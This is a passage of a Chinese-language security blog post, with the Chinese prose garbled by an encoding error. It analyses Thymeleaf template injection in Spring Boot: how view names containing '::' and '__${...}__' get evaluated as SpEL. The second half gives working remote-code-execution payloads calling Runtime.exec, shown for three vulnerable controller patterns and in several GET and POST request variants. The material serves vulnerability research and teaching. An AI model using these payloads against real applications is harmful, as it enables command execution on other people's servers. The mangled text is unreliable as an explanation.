<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934282783-62b8bcda-b7da-44fe-9252-df538f4bcd7e.png" alt="image.png" loading="lazy"></p>
<p>è¿™é‡Œå°±å¯ä»¥çœ‹åˆ°<strong>ThymeleafViewResolver</strong>çš„<code>resolveViewName</code>æ–¹æ³•è¢«è°ƒç”¨<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934386588-a6c54af4-08a9-4d38-9dae-970f4308d8f1.png" alt="image.png" loading="lazy"></p>
<p>è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼Œæœ€åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<strong>View</strong>å¯¹è±¡æ˜¯é€šè¿‡<code>ThymeleafViewResolver#loadView</code>ç”Ÿæˆçš„ï¼Œè¿™é‡Œè¿˜æ²¡æœ‰æ¶‰åŠåˆ°æ¨¡æ¿æ–‡ä»¶çš„è¯»å–ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934480852-1885a63f-ebe1-4270-80b0-dd011908c454.png" alt="image.png" loading="lazy"></p>
<p>åœ¨ç”±<code>ContentNegotiatingViewResolver#getBestView</code>é€‰å‡ºæœ€ä½³çš„<strong>View</strong>å¯¹è±¡åï¼Œå°±ä¼šè°ƒç”¨è¯¥å¯¹è±¡çš„<code>render</code>æ–¹æ³•ã€‚æ¥ç€æˆ‘ä»¬çœ‹ä¸‹<code>ThymeleafView#renderFragment</code>ï¼Œ<code>ThymeleafView#render</code>çš„æœ€ç»ˆè°ƒç”¨ã€‚</p>
<p><code>ThymeleafView#renderFragment</code>çš„å¤„ç†æµç¨‹å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰æ­¥ï¼š</p>
<ul>
<li>æ¸²æŸ“Thymeleafæ¨¡æ¿å‰çš„å‡†å¤‡ï¼šè¿™é‡Œä¸»è¦æ˜¯ä¸€äº›å˜é‡çš„æ£€æŸ¥å’Œä¸Šä¸‹æ–‡çš„è®¾ç½®ã€‚</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935393965-07d4006c-18d4-493f-9bd3-98ad23eb1eec.png" alt="image.png" loading="lazy"></figure>
<ul>
<li><code>viewtemplateName</code>çš„è§£æï¼šæ¼æ´çš„äº§ç”Ÿç‚¹ï¼Œä»£ç ä¼šæ ¹æ®<code>viewtemplateName</code>ä¸­æ˜¯å¦å«æœ‰<code>::</code>æ¥å†³å®šæ˜¯å¦è¦å¯¹å…¶è¿›è¡Œè§£æï¼Œæœ€åè§£æå‡º<code>templateName</code>å˜é‡ã€‚</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935621931-02f164fd-9b8d-47b3-91a0-ef0b54de2450.png" alt="image.png" loading="lazy"></figure>
<ul>
<li>æ¸²æŸ“æ¨¡ç‰ˆï¼Œå¤„ç†å“åº”ï¼šåœ¨åšå¥½å“åº”çš„ç±»å‹ã€å­—ç¬¦ç¼–ç ç­‰é…ç½®åï¼Œä½¿ç”¨<code>viewTemplateEngine.process</code>æ–¹æ³•è¯»å–æ¨¡æ¿æ–‡ä»¶ã€è§£ææ¨¡æ¿å†…å®¹ã€æ‰§è¡Œè¡¨è¾¾å¼ã€æ¸²æŸ“ç»“æœç­‰å¤šä¸ªæ­¥éª¤ã€‚æœ€åå°†å†…å®¹è¿”å›ç»™å®¢æˆ·ç«¯</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935867500-6167221f-714c-4558-9342-97caca9b9b25.png" alt="image.png" loading="lazy"></figure>
<h1 id="æ¼æ´æˆå› ">æ¼æ´æˆå› </h1>
<p>æ¼æ´çš„æˆå› å°±åœ¨è§£æ<code>viewTemplateName</code>çš„ä»£ç ä¸­ï¼Œå½“<code>viewTemplateName</code>ä¸­å«æœ‰<code>::</code>ï¼Œä¼šç”¨<code>&quot;~{&quot; + viewTemplateName + &quot;}&quot;</code>åŒ…è£¹å°†å…¶ä½œä¸ºä¸€ä¸ªç‰‡æ®µè¡¨è¾¾å¼ï¼Œè°ƒç”¨<code>parser.parseExpression</code>è¿›è¡Œè§£æ<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712936048123-abc8f184-0b05-4952-bd9d-9a4e4495b8fd.png" alt="image.png" loading="lazy"></p>
<p>è·Ÿè¿›å®ç°ï¼Œ<code>StandardExpressionParser#parseExpression</code>ä¸­æœ‰ä¸€æ­¥é¢„å¤„ç†çš„æµç¨‹ï¼Œæ ¹æ®åå­—å¯ä»¥çŒœåˆ°å®ƒå¤„ç†çš„å°±æ˜¯è¡¨è¾¾å¼ä¸­<code>__${expression}__</code>é¢„å¤„ç†è¡¨è¾¾å¼çš„éƒ¨åˆ†<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712937292709-f75f1916-50d4-408d-a0de-fe5377191773.png" alt="image.png" loading="lazy"></p>
<p>è·Ÿè¿›<code>StandardExpressionPreprocessor#preprocess</code>ï¼Œå¦‚æœæ²¡æœ‰<code>_</code>ç›´æ¥è¿”å›<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712937457017-1e2a1796-1461-45da-b850-79e86af0cc78.png" alt="image.png" loading="lazy"></p>
<p>ä¹‹åçš„è§£ææµç¨‹ä¼šå…ˆç”¨æ­£åˆ™<code>\_\_(.*?)\_\_</code>åŒ¹é…å‡º<strong>é¢„å¤„ç†è¡¨è¾¾å¼ä¹‹é—´çš„å†…å®¹</strong>ï¼Œå†ä¼ ç»™<code>StandardExpressionParser.parseExpression</code>è¿›è¡Œè§£æï¼ˆè¿™æ˜¯ä½œä¸ºäº†ä¸€ä¸ªå˜é‡è¡¨è¾¾å¼é€’å½’è§£æï¼Ÿï¼‰ï¼Œæœ€åè°ƒç”¨è§£æå‡ºæ¥çš„<strong>IStandardExpression</strong>å¯¹è±¡çš„<code>execute</code>æ–¹æ³•<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938072287-061f06bf-8c4c-49fd-a741-303f3cdfa727.png" alt="image.png" loading="lazy"></p>
<p>åœ¨<code>expression.execute</code>çš„æœ€åä¼šå°†<strong>é¢„å¤„ç†è¡¨è¾¾å¼ä¹‹é—´çš„å†…å®¹</strong>ä½œä¸º<strong>SpELæ‰§è¡Œè¡¨è¾¾å¼</strong>ï¼ˆåŠ å…¥å­¦ä¹ åˆ—è¡¨ï¼‰è§£æï¼Œè¿›è€Œè§¦å‘ä»»æ„ä»£ç æ‰§è¡Œã€‚<br>
<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938381093-b1806f25-ee8d-4633-8d95-a8d7004aa291.png" alt="image.png" loading="lazy"></p>
<p>å°ç»“ä¸€ä¸‹ï¼š</p>
<ul>
<li>æ¼æ´çš„æˆå› æ˜¯åœ¨<strong>ThymeleafView</strong>å¯¹è±¡è°ƒç”¨<code>render</code>æ–¹æ³•æ¸²æŸ“æ¨¡æ¿çš„æ—¶å€™äº§ç”Ÿçš„ï¼Œå‡†ç¡®çš„è¯´åº”è¯¥æ˜¯åœ¨è§£æè‡ªå·±çš„<code>templateName</code>å±æ€§æ—¶äº§ç”Ÿçš„</li>
</ul>
<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938848792-58c8f143-f455-4006-8959-e2e5512131e3.png" alt="image.png" loading="lazy"></figure>
<ul>
<li>å½“æ”»å‡»è€…å¯ä»¥æ§åˆ¶è§£æçš„<code>templateName</code>å³å¯äº§ç”Ÿæ¼æ´ï¼Œå…·ä½“è€Œè¨€æ»¡è¶³çš„æ¡ä»¶æœ‰ï¼ˆæ¥è‡ªturn1tupå¸ˆå‚…çš„æ€»ç»“ï¼‰ï¼š
<ul>
<li>ç”¨æˆ·ä¼ å…¥çš„å­—ç¬¦ä¸²æ‹¼æ¥åˆ°äº†<code>Controller</code>æ–¹æ³•çš„è¿”å›å€¼ä¸­ä¸”è¿”å›çš„è§†å›¾éé‡å®šå‘ï¼ˆé‡å®šå‘ä¼˜å…ˆçº§æœ€é«˜ï¼‰ï¼Œæˆ–URIè·¯å¾„æ‹¼æ¥äº†ç”¨æˆ·çš„è¾“å…¥ä¸”<code>Controller</code>æ–¹æ³•å‚æ•°ä¸­ä¸å¸¦æœ‰<code>ServletResponse</code>ç±»å‹çš„å‚æ•°</li>
<li>è§†å›¾å¼•æ“åç§°ä¸­éœ€è¦åŒ…å«<code>::</code>å­—ç¬¦ä¸²</li>
<li>è¢«æ‰§è¡Œè¡¨è¾¾å¼å­—ç¬¦ä¸²å‰åéœ€è¦å¸¦æœ‰ä¸¤ä¸ªä¸‹åˆ’çº¿ï¼Œå³<code>__${EL}__</code>ï¼›</li>
<li>å¦‚æœPOCåœ¨URIä¸­ï¼Œç”±äºURIæ ¼å¼åŒ–çš„åŸå› ä¸”æˆ‘ä»¬çš„POCä¸­å¸¦æœ‰<code>.</code>ç¬¦å·ï¼Œæ‰€ä»¥éœ€è¦åœ¨URIæœ«å°¾æ·»åŠ <code>.</code></li>
</ul>
</li>
</ul>
<h1 id="æ”»å‡»æ–¹å¼">æ”»å‡»æ–¹å¼</h1>
<p>æ ¹æ®å¯æ§ä½ç½®çš„ä¸åŒï¼Œå¤§è‡´æœ‰ä¸‰ç§åˆ©ç”¨åœºæ™¯</p>
<h2 id="select">select</h2>
<pre><code class="language-java">@GetMapping(&quot;/fragment&quot;)
public String fragment(@RequestParam String section) {
    return &quot;index :: &quot; + section; // fragment is tainted
}
</code></pre>
<p>å¾ˆç®€å•æ˜“æ‡‚ï¼Œpayload</p>
<pre><code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x
</code></pre>
<h2 id="path">/path</h2>
<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
public String path(@RequestParam String lang) {
    return &quot;user/&quot; + lang + &quot;/index&quot;; // template path is tainted
}
</code></pre>
<p>payloadå’Œä¸Šé¢ä¸€æ ·ï¼Œè™½ç„¶ç¬¬ä¸€æ„Ÿè§‰æœ‰ç‚¹åç›´è§‰ï¼Œä½†çœ‹åˆ°æœ€åå¤„ç†çš„<code>viewTemplateName</code>å°±æ‡‚äº†</p>
<pre><code>user/__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22).getInputStream()).next()}__::.x/index
</code></pre>
<h2 id="uri-path">URI PATH</h2>
<pre><code class="language-java">@GetMapping(&quot;/doc/{document}&quot;)
public void getDocument(@PathVariable String document) {
    log.info(&quot;Retrieving &quot; + document);
    //returns void, so view name is taken from URI
}
</code></pre>
<p>å› ä¸º<code>mav</code>è¿”å›å€¼ä¸ºç©ºï¼Œæ‰€ä»¥<code>viewTemplateName</code>ä¼šä»uriä¸­è·å–ï¼Œç›´æ¥åœ¨<code>{document}</code>ä½ç½®ä¼ å…¥payloadå³å¯</p>
<pre><code>/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.x
</code></pre>
<h2 id="å…¶ä»–å§¿åŠ¿">å…¶ä»–å§¿åŠ¿</h2>
<p>è®°ä¸‹poc</p>
<pre><code># æ„é€ å›æ˜¾ï¼Œåœ¨æœ€ååŠ ä¸¤ä¸ª.
/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::..

# æœ€ååªåŠ ä¸ª.ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸ä¸€å®šå¿…é¡»æ˜¯.x
/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.

# :: ä½ç½®ä¸ç”¨å›ºå®š
::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__

# POSTæ–¹å¼
POST /path HTTP/1.1
Host: localhost:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 135

lang=::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__

# çœç•¥__
# æƒ…å†µå¦‚ä¸‹
@RequestMapping(&quot;/path&quot;)
public String path2(@RequestParam String lang) {
    return lang; //template path is tainted
}

GET /path2?lang=$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d::.x HTTP/1.1
Host: localhost:8090
</code></pre>
<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<p><a href="https://www.cnblogs.com/CoLo/p/15507738.html">https://www.cnblogs.com/CoLo/p/15507738.html</a><br>
<a href="https://xz.aliyun.com/t/9826?">https://xz.aliyun.com/t/9826</a><br>
<a href="https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/">https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/</a><br>
<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p>
]]></content>
    </entry>
</feed>